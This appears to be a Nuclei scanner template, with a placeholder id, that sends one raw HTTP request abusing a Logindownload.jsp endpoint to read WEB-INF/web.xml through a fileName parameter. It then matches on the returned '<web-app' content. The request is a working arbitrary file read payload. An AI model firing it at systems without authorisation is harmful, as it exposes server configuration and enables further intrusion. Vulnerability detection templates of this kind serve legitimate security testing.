id: need_to_change

info:
  name: need_to_change
  author: msk
  severity: high


http:
  - raw:
      - |
        GET /defaultroot/public/edit/logindownload/Logindownload.jsp;?fileName=WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Connection: close
        Accept-Encoding: gzip


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"<web-app")

